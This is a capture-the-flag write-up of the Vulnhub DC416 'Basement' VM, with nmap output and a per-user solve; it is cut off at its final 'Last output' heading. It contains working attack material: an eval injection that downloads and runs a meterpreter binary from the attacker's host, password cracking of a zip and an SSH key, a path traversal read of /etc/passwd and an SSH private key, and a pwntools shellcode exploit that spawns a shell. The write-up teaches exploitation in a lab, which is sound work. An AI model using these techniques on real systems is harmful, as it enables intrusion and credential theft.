+++
Description = "Vulnhub - DC416: Basement Writeup"
title = "Vulnhub - DC416: Basement Writeup"
date = "2016-12-18T01:00:00+01:00"
metakeys = ["vulnhub", "walkthrough", "writeup", "DC416", "basement"]
image = "/img/misc/vulnhub.png"
+++

Basement is the first of 4 VMs from the DC416 CTF by [@barrebas](https://twitter.com/barrebas) on [Vulnhub](https://www.vulnhub.com/entry/dc416-2016,168/). There are 5 flags on this machine but I was only able to get 4 of them.

<!--more-->

Here are my other writeups for the DC416 challenges:

- [DC416 Baffle](/post/vulnhub_dc416_baffle/)
- [DC416 Dick Dastardly](/post/vulnhub_dc416_dick_dastardly/)
- [DC416 Fortress](/post/vulnhub_dc416_fortress/)

# information gathering

Before you start with a portscan you need to wait a few minutes because there are several binaries executed by cronjobs. I noticed this during exploiting the machine so be sure to start nmapping after the machine runs a few minutes.

Nmap Scan:

```
Starting Nmap 7.31 ( https://nmap.org ) at 2016-12-17 22:15 CET
Nmap scan report for 192.168.56.101
Host is up (0.00024s latency).
Not shown: 65529 closed ports
PORT      STATE SERVICE           VERSION
22/tcp    open  ssh               OpenSSH 6.7p1 Debian 5+deb8u3 (protocol 2.0)
| ssh-hostkey:
|   1024 f4:2a:b3:db:b8:54:78:c4:8e:0e:e0:f9:15:fd:9f:3b (DSA)
|   2048 34:b7:68:d7:0b:f8:e4:15:fe:fa:01:42:9e:ec:d1:ea (RSA)
|_  256 c0:36:b9:27:51:54:02:4b:1f:a5:77:58:a6:9d:d4:1e (ECDSA)
80/tcp    open  http              Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: baffle
8080/tcp  open  http-proxy        ------[-->+++<]>.[->+++<]>.---.++++.
|_http-server-header: ------[-->+++<]>.[->+++<]>.---.++++.
|_http-title: Site doesn't have a title (text/html).
8090/tcp  open  unknown
10000/tcp open  snet-sensor-mgmt?
10001/tcp open  tcpwrapped

MAC Address: 08:00:27:DF:F5:5E (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.4
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.24 ms 192.168.56.101

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 110.74 seconds
```

# jack

So let's start with the service on port 10000. The script asks the user to enter a number of packets to send and executes a ping:

```
root@kali:~/basement# nc 192.168.56.101 10000
 Please enther number of packets: 1

PING localhost (127.0.0.1) 56(84) bytes of data
64 bytes from localhost (127.0.0.1): icmp_seq=1 ttl=64 time=0.053 ms
```

When entering something different we can see there is a python script which takes user input through the `input` method.

```
root@kali:~/basement# nc 192.168.56.101 10000
 Please enther number of packets: help
Traceback (most recent call last):
  File "./ping.py", line 3, in <module>
    num_packets = int(input(' Please enther number of packets: '))
TypeError: int() argument must be a string or a number, not '_Helper'
```

In python 2 the `ìnput` method is the same as `eval(raw_input())` so it's possible to evaluate python statements (In python 3 `input` behaves the same as `raw_input`).

So by trying the payload `__import__('os').system('id')` we can see the user running this script:

```
root@kali:~/basement# nc 192.168.56.101 10000
 Please enther number of packets: __import__('os').system('id')
uid=1000(jack) gid=1000(jack) groups=1000(jack),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)

PING localhost (127.0.0.1) 56(84) bytes of data
```

So the next step is to download a meterpreter binary and execute it with the following set of commands:

```
echo "__import__('os').system('wget -O /tmp/meterpreter http://192.168.56.3/meterpreter')" | nc 192.168.56.101 10000
echo "__import__('os').system('chmod +x /tmp/meterpreter')" | nc 192.168.56.101 10000
echo "__import__('os').system('/tmp/meterpreter &')" | nc 192.168.56.101 10000
```

Using the meterpreter session we are able to get the first flag:

```
meterpreter > cat flag.txt
flag{j4cks_t0t4L_l4cK_0f_$uRpr1sE}
```

# marla #1

By looking at `/etc/passwd` we can see there are 4 seperate users on the system so probably each user holds one flag.

```
jack:x:1000:1000:jack,,,:/home/jack:/bin/bash
marla:x:1001:1001:marla,,,:/home/marla:/bin/marla
tyler:x:1002:1002:tyler,,,:/home/tyler:/bin/tyler
robert:x:1003:1003:robert,,,:/home/robert:/bin/bash
```

In the folder `/home/jack/.secret/` there is a file called `marla.xip`. A file command on the file reveals only `data` so we have to dig deeper.

```
root@kali:~# file marla.xip
marla.xip: data
```

barrebas got me the hint that this `xip` extension is a mix of two filetypes. So the file is probably a XOR encrypted ZIP archive. To quickly test XOR keys I used [xortool](https://github.com/hellman/xortool.git).

```
root@kali:~/xortool# xortool -b /root/marla.xip
The most probable key lengths:
   3:   14.6%
   6:   19.6%
   9:   11.0%
  12:   13.8%
  15:   7.4%
  18:   10.1%
  21:   5.6%
  24:   7.1%
  27:   5.1%
  30:   5.6%
Key-length can be 3*n
256 possible key(s) of length 6:
M4YH3M
L5XI2L
O6[J1O
N7ZK0N
I0]L7I
...
Found 0 plaintexts with 95.0%+ printable characters
See files filename-key.csv, filename-char_used-perc_printable.csv
```

Now let's look at the directory with the decoded files and see if we can spot something of interest:

```
root@kali:~/xortool/xortool_out# file * | grep -v "     data"
000.out:                               Zip archive data
197.out:                               PGP\011Secret Key -
199.out:                               PGP\011Secret Sub-key -
220.out:                               DOS executable (COM, 0x8C-variant)
232.out:                               COM executable for DOS
252.out:                               AIX core file fulldump
filename-char_used-perc_printable.csv: ASCII text
filename-key.csv:                      ASCII text
```

So we have found a ZIP archive. By looking at the generated csv we can see the XOR key beeing used was `M4YH3M`.

Next step is to examine the contents of the zip file.

```
root@kali:~# mv 000.out /root/marla.zip
root@kali:~# unzip -l marla.zip
Archive:  marla.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
     1766  2016-11-22 04:41   marla
      396  2016-11-22 04:49   marla.pub
---------                     -------
     2162                     2 files
```

Unfortunately the zip file is encrypted with a password so let's try to crack it.

JohnTheRipper contains a handy little script called `zip2john` to extract the password hash for cracking. I then removed all except the hash from the file and ran hashcat against it.

```
[firefart@linux hashcat]$ /home/firefart/hacking/JohnTheRipper/run/zip2john /home/firefart/marla.zip
marla.zip:$zip2$*0*1*0*05ed2b46cc5c8fdd*4dfb*14c*3c099c875a5b4e660f310f657f34d7023b638556bc90a38168d5d752454a8954ebe2a08e064153f36afa0eb398f11139fae94e5cb7678dbda653de495847cd9e2c8c03573f6260f349a6e553b3a21647bcb351ae01ef15538cd613b97a144ad97d2f0db50bd29e093ea7772db8e465c5e6019f4427eab1f059241f86091148e8e292171a7cebb85fa07826f8b2061414931b217e63aa187ee508bad16cb1c57993bd703096b77e4e376edd9842e4363e58512b26422cbf1961a4ad741d4ab9d292a447cd6eaccd23e040702edb8be854798a35a63491b07b4c3b820e6c2a394e42a17180720cd9287f953f3482382068df0a98755ee27ba9ee0667b5b813cc3c9105a92d9f76566e9674d0c8ccc4050abeda5089d854546a5a39da8d93da503179dc6e0d847d29ede19654471d5a875e65a81e700810b4b7f1657bf8d78869e8078681dabfc35d0e0bc15fee*321fdfa476052bcf20c6*$/zip2$:::::marla.zip

[firefart@linux hashcat]$ cat /home/firefart/marla.zip.hash
$zip2$*0*1*0*05ed2b46cc5c8fdd*4dfb*14c*3c099c875a5b4e660f310f657f34d7023b638556bc90a38168d5d752454a8954ebe2a08e064153f36afa0eb398f11139fae94e5cb7678dbda653de495847cd9e2c8c03573f6260f349a6e553b3a21647bcb351ae01ef15538cd613b97a144ad97d2f0db50bd29e093ea7772db8e465c5e6019f4427eab1f059241f86091148e8e292171a7cebb85fa07826f8b2061414931b217e63aa187ee508bad16cb1c57993bd703096b77e4e376edd9842e4363e58512b26422cbf1961a4ad741d4ab9d292a447cd6eaccd23e040702edb8be854798a35a63491b07b4c3b820e6c2a394e42a17180720cd9287f953f3482382068df0a98755ee27ba9ee0667b5b813cc3c9105a92d9f76566e9674d0c8ccc4050abeda5089d854546a5a39da8d93da503179dc6e0d847d29ede19654471d5a875e65a81e700810b4b7f1657bf8d78869e8078681dabfc35d0e0bc15fee*321fdfa476052bcf20c6*$/zip2$

[firefart@linux hashcat]$ ./hashcat -a 3 -m 13600 /home/firefart/marla.zip.hash

$zip2$*0*1*0*05ed2b46cc5c8fdd*4dfb*14*3c099c875a5b4e660f310f657f34d7023b638556bc90a38168d5d752454a8954ebe2a08e064153f36afa0eb398f11139fae94e5cb7678dbda653de495847cd9e2c8c03573f6260f349a6e553b3a21647bcb351ae01ef15538cd613b97a144ad97d2f0db50bd29e093ea7772db8e465c5e6019f4427eab1f059241f86091148e8e292171a7cebb85fa07826f8b2061414931b217e63aa187ee508bad16cb1c57993bd703096b77e4e376edd9842e4363e58512b26422cbf1961a4ad741d4ab9d292a447cd6eaccd23e040702edb8be854798a35a63491b07b4c3b820e6c2a394e42a17180720cd9287f953f3482382068df0a98755ee27ba9ee0667b5b813cc3c9105a92d9f76566e9674d0c8ccc4050abeda5089d854546a5a39da8d93da503179dc6e0d847d29ede19654471d5a875e65a81e700810b4b7f1657bf8d78869e8078681dabfc35d0e0bc15fee*321fdfa476052bcf20c6*$/zip2$:m4rl4

Session..........: hashcat
Status...........: Cracked
Hash.Type........: WinZip
Hash.Target......: $zip2$*0*1*0*05ed2b46cc5c8fdd*4dfb*14*3c099c875a5b4e660f310f657f34d7023b638556bc90a38168d5d752454a8954ebe2a08e064153f36afa0eb398f11139fae94e5cb7678dbda653de495847cd9e2c8c03573f6260f349a6e553b3a21647bcb351ae01ef15538cd613b97a144ad97d2f0db50bd29e093ea7772db8e465c5e6019f4427eab1f059241f86091148e8e292171a7cebb85fa07826f8b2061414931b217e63aa187ee508bad16cb1c57993bd703096b77e4e376edd9842e4363e58512b26422cbf1961a4ad741d4ab9d292a447cd6eaccd23e040702edb8be854798a35a63491b07b4c3b820e6c2a394e42a17180720cd9287f953f3482382068df0a98755ee27ba9ee0667b5b813cc3c9105a92d9f76566e9674d0c8ccc4050abeda5089d854546a5a39da8d93da503179dc6e0d847d29ede19654471d5a875e65a81e700810b4b7f1657bf8d78869e8078681dabfc35d0e0bc15fee*321fdfa476052bcf20c6*$/zip2$
Time.Started.....: Thu Jan 19 16:33:24 2017 (57 secs)
Time.Estimated...: Thu Jan 19 16:34:21 2017 (0 secs)
Input.Mask.......: ?1?2?2?2?2 [5]
Input.Charset....: -1 ?l?d?u, -2 ?l?d, -3 ?l?d*!$@_, -4 Undefined
Input.Queue......: 5/15 (33.33%)
Speed.Dev.#1.....:  1262.8 kH/s (11.10ms)
Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
Progress.........: 71884800/104136192 (69.03%)
Rejected.........: 0/71884800 (0.00%)
Restore.Point....: 1152000/1679616 (68.59%)
Candidates.#1....: ma7f7 -> mq7g5
HWMon.Dev.#1.....: Temp: 73c Fan: 56% Util: 95% Core:1911Mhz Mem:3802Mhz Lanes:16

Started: Thu Jan 19 16:33:16 2017
Stopped: Thu Jan 19 16:34:21 2017
```

Awesome so the password is `m4rl4`.

We are now able to extract the zip file with `p7zip`.

```
root@kali:~# p7zip -d marla.7z

7-Zip (a) [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,1 CPU Intel(R) Core(TM) i7-3520M CPU @ 2.90GHz (306A9),ASM,AES-NI)

Scanning the drive for archives:
1 file, 1974 bytes (2 KiB)

Extracting archive: marla.7z
WARNING:
marla.7z
Can not open the file as [7z] archive
The file is open as [zip] archive

--
Path = marla.7z
Open WARNING: Can not open the file as [7z] archive
Type = zip
Physical Size = 1974


Enter password (will not be echoed):
Everything is Ok

Archives with Warnings: 1
Files: 2
Size:       2162
Compressed: 1974
```

So let's have a look at the extracted files:

```

root@kali:~# cat marla.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCuh1NziT0vauHjqRvPIDQnFKYYtaYP1h56DXesZ6ZlSezFZVtJ1oQvLh3WJGgH7Bojzwxo4k5xwvw/0fyvCD68GGA99j8wfcYvFQ60BGMUYHfEduQPs0sAmL9tftIUY1vLf6htgCfz8oJ6Pi9YxLkgrS0+udGGxU0rXkU6hfaT710VH2DpvxymXbrKHHnd2wYmf/VVg54ugRyKWjKSBR+IkXTJr0FSMmsb7s1O84r1XTjJUJc6AZkiN1NLMxDQ1xnb/ToCnSpPIDm83fPDLDYhnlNZ2YoVqq9TTYVF9lxBaYLEjhVI+HKFF2geWjnMR5IHU/YwKWodcqh2GYY/LGNV marla@basement


root@kali:~# cat marla
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,4A3641AA61921099DAB3E32222AE8221

k8zDFT8UXhpb7Dn+KzYv6mYuAI0vF25s/zFpuvtm31FtTwOAzqz+ukei2DR+r4Zb
QKGV5EPf0ymcx6Nh4X700eRa555hFDrWMRwLAy7bTkYK5MbLY3On7BqBnmpbs/bd
Pd/VpmvMtUnl8YcMF756NLt0sgqwWbf8DGFUcJZTGEsZhwTL86cCYyFbbdOHijzY
Wi+OjgVBxw62VrdEn8HHA0Hks72LRGAsXLJ4ReT6nm/6H88idKHtnc1CXGzUtEwR
E7/Bzzqn/P1rTrnPp/adV4oAC+Q86Sdy5RHuH35KC6c6WgpFRprqeWeLdf6aBBF0
yadmGUu4PrWP7iYd7Bc4k2Czlr0pk1x0GjqedjFYmPWypllfZvMriQa6QhYkKlGl
ecEm8Usrok54u8jX1VZtdRu1+6gNPZcw8FOK1GTks2L9ywvWoSNOGr5LFBDBYufq
SNNUQq0cEyAl3KaPT5vPyEcrqAa7NKmIl5uImECPG93iIsfOt3P4ujVwWuT3p100
KHnHEybuZXTBRUPmHoE+wXvFyLAWzHG8d6cy18FzGEyogUbs+d5GmdFjsyaaLeES
8AtkGrWrUAgo/NDpbVdHoLmwjzvxlDkk+Uk3/KN5qjFKajbav9EoMJNeCac1Ax0i
KHiSvyPtifWu9Mj8IYq6zIVVFoVPc4swDrqxsNkwA8uAXLCIBk/lHOBryIPVmsOd
4gWhae23ul+HC5gHwlXUfq5Zrljhqpw9D50veSizqdtwmWgvs1crkddXbTwUSvrb
kZHQoY2PqfJPmF3TNt5RQvwNIaOMospy29niKk/qICaZ1t9KUyMdfNmyVzHGnJPz
Ae6pdfCsgoymkO1zd4TVaGTRH2tt0ZRXECHPTG/5i8IRJGB4hlTJ4z0QNcVPQGdF
sI9GuUuRzaIpVbbxf50OG5qWfVRJR2lWwfvIEgmfvKQs9qJBq4X05NeagWoDKhrH
/90k1S3GI5rw9RyjzD1I4k1li+PjyWs+wZAEn39Hqlxuk+gMWuKCr6Wel/dV3exU
XlkGJLJo1SUK1Uh2Z6CeSwdSVMf2j21pMbeaw8U9RQund9EOwln8JDKtdQXYW9ba
SE/hUpvlNHPG/90Tp2JQCkk/MinwV4IGev7mn9piltL8Q7qcU1o9TpAxtdonyaYI
UYnzpv+g/0fhKnycwRttVukt7Mtgvr0SMCXcImMjdnDpVxbrbEWtLgFsZayg+SzQ
/03KMOA9AVoo48ZlLa+oERqeedXDBqmKkNJwIsBcYEywHl6NlEHCZk2S/lcr+ra9
im+l2nua3IvYYIRnWHWoLs0D+Hi/PvQHmj3e2YBeIZMYGPHk8XQ17cofwqU7VDr7
x6nP22au0LGKTj4+E46r1hEWs9C0X8AMJjfShb+CyN/imo/3a3bJiazE1F5IpKlY
5UejDh7GCcxnvmjXlY4q+7DeJlz5VSjKjfR5V0b5mkcLEI18c2sBkTVdMVzzBGQO
kTNSGJSOrF5el9+wlpLY4E8loocJpzH3P3uu+fOwHtNiul5RAlotfJnJd9lYea5k
W581cgXIWgN6actoiIGZXlHKB5Zsdb3GdmmG0Lb50lsL4GH8MIKDKdumUKSwrT20
-----END RSA PRIVATE KEY-----
```

Crap, another encrypted key. But we can see clearly this two files are SSH keys used for connecting as `marla` to the machine using SSH.

Again, JohnTheRipper has a script ready for us: `sshng2john.py`

```
[firefart@linux run]$ /home/firefart/hacking/JohnTheRipper/run/sshng2john.py /home/firefart/marla.key > /home/firefart/marla
[firefart@linux run]$ ./john /home/firefart/marla.key
Using default input encoding: UTF-8
No password hashes loaded (see FAQ)
[firefart@linux run]$ ./john /home/firefart/marla
Using default input encoding: UTF-8
Loaded 1 password hash (SSH-ng [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Will run 8 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
singer           (/home/firefart/marla.key)
singer           (/home/firefart/marla.key)
```

Jeah so the key password is `singer`.

We can now use this password to retreive the next flag:

```
root@kali:~# ssh -i marla marla@192.168.56.101
The authenticity of host '192.168.56.101 (192.168.56.101)' can't be established.
ECDSA key fingerprint is SHA256:CGwzPRVhg2hHuFrgbZjV6MHx+xXtDLYXCzQJO3PrH4U.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '192.168.56.101' (ECDSA) to the list of known hosts.
Enter passphrase for key 'marla':

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
well done! your flag is flag{l4y3rs_up0n_l4y3rs}
Connection to 192.168.56.101 closed.
```

# marla #2

By looking at the running processes there seems to be an audio stream of a flag streamed by `marla` and a binary only accepting connections from localhost run by `robert`.

```
marla     3785  4.5  6.2 464280 31612 ?        S    02:10   0:06 ffserver -f /home/marla/ffserver.conf
marla     3787 94.4  6.3 462656 32204 ?        R    02:10   2:10 ffmpeg -stream_loop -1 -f wav -i /home/marla/flag.wav http://127.0.0.1:8090/feed1.ffm
robert    3782  0.0  0.5  19644  2808 ?        S    02:10   0:00 socat TCP-LISTEN:10001,reuseaddr,fork,range=127.0.0.1/32 EXEC:./tenbytes,pty,stderr,echo=0
```

First we try the streaming webserver:

```
$ nc 127.0.0.1 8090
GET / HTTP/1.0

HTTP/1.0 301 Moved
Location: http://localhost/flag.mpg
Content-type: text/html
```

So we need to get a file called `flag.mpg`. As this file is streamed endlessly we need to kill the download after a while as it will never end.

```
wget http://127.0.0.1:8090/flag.mpg
```

By downloading the mpg and listening to it locally, we can hear a computer generated voice saying the following numbers:

```
102 108 97 103 123 98 82 52 105 110 95 112 97 82 97 115 49 116 101 36 125
```

By decoding the numbers as ascii, we get the second flag `flag{bR4in_paRas1te$}`

```
a = "102 108 97 103 123 98 82 52 105 110 95 112 97 82 97 115 49 116 101 36 125"
b = ""
for x in a.split(" "):
	b += chr(int(x))
print(b)
```

# tyler

When connecting to the webserver on port 8080 the following server header is returned

```
------[-->+++<]>.[->+++<]>.---.++++.
```

This string is definitely [Brainfuck](https://en.wikipedia.org/wiki/Brainfuck). Using an [online decoder](https://copy.sh/brainfuck/) we can see the string translates back to `webf`.

When trying to access files in the webroot the webserver crashes and only comes up again after some time (probably by a cron job).

All error messages are also translated to Brainfuck:

```
root@kali:~# nc 192.168.56.101 8080
webf
HTTP/1.1 501 Not Implemented
Content-type: text/html

<html><title>Error</title><body bgcolor=ffffff>
501: Not Implemented
<p>+[------->++<]>.+.+++++.[---->+<]>+++.++[->+++<]>.+++++++++.++++++.-------.----------.: webf
<hr><em>------[-->+++<]>.[->+++<]>.---.++++.</em>
```

By looking at the process list again the binary running seems to be `tiny`:

```
14709  1      run_tiny.sh              0        tyler     /bin/bash /home/tyler/run_tiny.sh
14711  14709  tiny                     0        tyler     /home/tyler/tiny 8080
```

By asking our friend google this seems to be the [tiny-web-server](https://github.com/shenfeng/tiny-web-server). This webserver behaves as pythons `SimpleHTTPServer` and serves the whole directory from where it is run. By looking at the issues page there seems to be an unpatched arbitrary file read vulnerability [https://github.com/shenfeng/tiny-web-server/issues/2](https://github.com/shenfeng/tiny-web-server/issues/2).

Our webserver crashes when requesting files normally so let's try to request `../../../../../../../etc/passwd` encoded in Brainfuck

```
root@kali:~# nc 192.168.56.101 8080
GET ++[------>+<]>+++..+.-..+.-..+.-..+.-..+.-..+.-..+.[--->+<]>.[--->+<]>---.++[->+++<]>+.-[-->+<]>--.+[----->+<]>.[----->++<]>+.--[--->+<]>--..++++.[->+++<]>-. HTTP/1.0

HTTP/1.1 200 OK
Server: ------[-->+++<]>.[->+++<]>.---.++++.
Content-length: 1445
Content-type: text/plain

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:103:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:104:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:105:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:106:systemd Bus Proxy,,,:/run/systemd:/bin/false
jack:x:1000:1000:jack,,,:/home/jack:/bin/bash
marla:x:1001:1001:marla,,,:/home/marla:/bin/marla
tyler:x:1002:1002:tyler,,,:/home/tyler:/bin/tyler
robert:x:1003:1003:robert,,,:/home/robert:/bin/bash
sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin
```

Bingo!

So we are able to read files as `tyler` but we already looked around on the server as `jack` so we are interested in the files in tyler's home directory. We can not use tools like dirbuster because it crashes the server so my solution was to come up with a simple python script to encode all wordlist entries to Brainfuck, request the file and save it:

```python
#!/usr/bin/env python3

import http.client
from time import sleep

def sf(filename, data):
    with open(filename, 'wb') as f:
        f.write(data)

def rf(filename):
    with open(filename, 'rt') as f:
        return f.readlines()

wordlist = "/usr/share/wordlists/dirb/common.txt"

def char2bf(char):
    result_code = ""
    ascii_value = ord(char)
    factor = ascii_value / 10
    remaining = ascii_value % 10
    result_code += "{}".format("+" * 10)
    result_code += "["
    result_code += ">"
    result_code += "{}".format("+" * int(factor))
    result_code += "<"
    result_code += "-"
    result_code += "]"
    result_code += ">"
    result_code += "{}".format("+" * remaining)
    result_code += "."
    result_code += "[-]"
    return result_code

def str2bf(string):
    result = ""
    for char in string:
        result += char2bf(char)
    return result

words = rf(wordlist)
counter = 1

#  words = ['.ssh/id_rsa']

for w in words:
    w = w.strip()
    filename = str2bf(w)
    try:
        conn = http.client.HTTPConnection("192.168.56.101", 8080)
        conn.request("GET", filename)
        resp = conn.getresponse()
        data = resp.read().strip()
        if b"404: Not Found" in data:
            print("File {} not found".format(w))
        else:
            filename = "{}_{}.loot".format(counter, w.replace("/", "_"))
            sf(filename, data)
            print("File {} saved!!!!!!".format(w))
    except http.client.IncompleteRead:
        print("File {} returned an error (most likely it's a directory)".format(w))
        print("This request crashed the webserver so let's wait a little ....")
        sleep(30)
    finally:
        if conn:
            conn.close()
    counter += 1
```

By executing the script the server crashed at the `.ssh` entry so it must be an issue when requesting directories. But this also drove me in the right direction to try if there is an `.ssh/id_rsa` private key file present.

After modifying the script we are able to download the private key file, ssh to the server as `tyler` and get the next flag `flag{l3t_Th3_cH1P$_f4LL_wH3Re_tHey_m4y}`:

```
root@kali:~/basement# ssh -i basement_tyler.key tyler@192.168.56.101

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sat Dec 17 10:25:57 2016 from 192.168.56.3
well done! your flag is flag{l3t_Th3_cH1P$_f4LL_wH3Re_tHey_m4y}
Connection to 192.168.56.101 closed.
```

# robert

Robert's flag took me the most time. There is a binary running on Port 10001 requesting 10 bytes from the user and then executes them. To play with this locally I added a `portfwd` in meterpreter.

First I tried to get some custom shellcode into the 10 bytes but none of my attempts worked and this really frustrated me. So I tried to think about the program flow and how the program could be implemented and this ended up in some kind of blind shellcode crafting.

I thought there must be a call to `read` writing the 10 bytes to an executable area in memory and then a `jmp` or `call` instruction has to be executed to get to the custom shellcode. If we are able to execute the `read` call again using a bigger length we would be able to write shellcode to memory and execute it.

By looking at the [sys_read](http://syscalls.kernelgrok.com/) syscall we can see the length to read needs to go in the `EDX` register.

So our assumption about the execution flow is the following

```
junk
mmap
junk
printf("Tee hee! Gimme ten bytes to run!")
junk
read 10 bytes
junk
jmp/call to read bytes
junk
```

Hopefully the instruction executed is a `CALL` instruction because it pushes the current return address to the stack and executes a `JMP`. This way we could pop the adress from the stack and return to it a few instruction before and hope to hit the `read` syscall with our custom (bigger) `EDX` value.

My custom shellcode to pop the return address into a register, subtract a value from it and jump to it took too many bytes to also get a bigger value into `EDX`. So my approach was to execute the first read, add my custom `pop`, `sub`, `jmp` shellcode and also double the value in the `EDX` register which hopefully is still `10`. When executing this code a few times we should be able to double `EDX` on each run, execute a read with a big value and finally execute our shellcode. So for this to work a `CALL` instruction needs to be executed and `EDX` must not be changed.

This approach was a lot try and error because there is absolutely no response but after doing hundreds of runs I finally was able to execute my own shellcode!

The script does the following

- generate the maximum 10 byte payload:
  _ double the value in EDX (add edx, edx)
  _ pop the return value from the stack into a register
  _ subtract a value from it
  _ jump to the new value and hope we hit a location where the read call is executed
- sends the payload the first time. If we hit the correct value to subtract a new read should be executed
- sends the payload over and over again, every time doubling the value in EDX
- once we reach the desired length in `EDX` the shellcode is sent and the `CALL` instruction calls it

To find the value to subtract from EDX we simply loop over 0 till 255 and try every value. This will jump in one byte steps relative to the `CALL` instruction till we hit the `READ` call again.

Once the correct offset is found, `/bin/sh` is executed and we have a shell as `robert`!

```python
#!/usr/bin/env python2

from pwn import *

context(bits=64,
        os='linux',
        aslr=False,
        # log_level='DEBUG',
        terminal=['tmux', 'splitw', '-l', '45'])

def encode_payload(p):
    return "".join("\\x{:02x}".format(ord(c)) for c in p)

def calculate_iterations(number):
    number = float(number)
    iterations = 0
    while number >= 10.0:
        iterations += 1
        number /= 2
    return iterations

local = False
#  local = True
debug = False

offset = 0

# the read call should be in the last 255 bytes
while offset <= 255:
    try:
        log.info("Trying offset {}".format(offset))
        if local:
            p = process("./tenbytes")
            if debug:
                gdb_cmd = []
                #  gdb_cmd.append("b *{:#08x}".format(0x00400697))
                gdb_cmd.append("c")
                gdb_cmd = "\n".join(gdb_cmd)
                gdb.attach(p, execute=gdb_cmd)
                raw_input("Press enter when GDB is running")
        else:
            p = remote("127.0.0.1", 10001)

        # EDX: how many bytes to read
        # so do a loop, double the bytes in EDX
        # till we have our desired value,
        # pop the return adress into rdi
        # and bruteforce our way back the stack
        # till we reach a point where the read loop
        # is executed again
        # after our loop we should be able to read
        # a bigger value to the stack and execute it
        payload  = ""
        payload += "\x01\xd2"       # add edx, edx
        payload += "\x5f"           # pop rdi
        payload += "\x48\x83\xef"   # sub rdi, xxx
        payload += chr(offset)
        payload += "\xff\xe7"       # jmp rdi
        payload = payload.ljust(10, "\x90")

        if len(payload) > 10:
            log.error("Payload too long! ({} bytes). Offset {}".format(len(payload), offset))

        log.info("Payload: {}".format(encode_payload(payload)))

        p.recvline() # receive greeting

        #  1:   0x10     = 10
        #  2:   0x14     = 20
        #  3:   0x28     = 40
        #  4:   0x50     = 80
        #  5:   0xA0     = 160
        #  6:   0x140    = 320
        #  7:   0x280    = 640
        #  8:   0x500    = 1280
        edx_should_be = 0x500 # length of the next read
        iterations = calculate_iterations(edx_should_be)
        log.info("Iterations: {}".format(iterations))
        for i in range(1, iterations):
            p.send(payload)
        log.info("EDX should now be {:#4x}".format(edx_should_be))

        # second stage
        #  ./msfvenom -p linux/x64/exec cmd=/bin/sh -f py -v shell
        #  No platform was selected, choosing Msf::Module::Platform::Linux from the payload
        #  No Arch selected, selecting Arch: x64 from the payload
        #  No encoder or badchars specified, outputting raw payload
        #  Payload size: 47 bytes
        #  Final size of py file: 248 bytes
        shell = "\xcc" if local and debug else ""
        shell += "\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68"
        shell += "\x00\x53\x48\x89\xe7\x68\x2d\x63\x00\x00\x48\x89\xe6"
        shell += "\x52\xe8\x08\x00\x00\x00\x2f\x62\x69\x6e\x2f\x73\x68"
        shell += "\x00\x56\x57\x48\x89\xe6\x0f\x05"

        log.info("Sending shellcode")
        p.send(shell)

        if local:
            # if we are local there is no tty error message
            sleep(0.1)
            p.sendline("id")
            output = p.recvline(timeout=0.1)
            if output and "uid=" in output:
                log.info("Found offset!!! {}".format(offset))
                break
        else:
            # check for no tty message
            p.sendline()
            output = p.recvline(timeout=0.5)
            if output and "tty" in output:
                log.info("Found offset!!! {}".format(offset))
                break

        if offset == 255:
            log.error("No valid offset found!")
        p.close()
    except EOFError:
        log.warning("Error on offset {}".format(offset))
        p.close()
    finally:
        offset += 1

p.interactive()
```

Last output from the run:

```
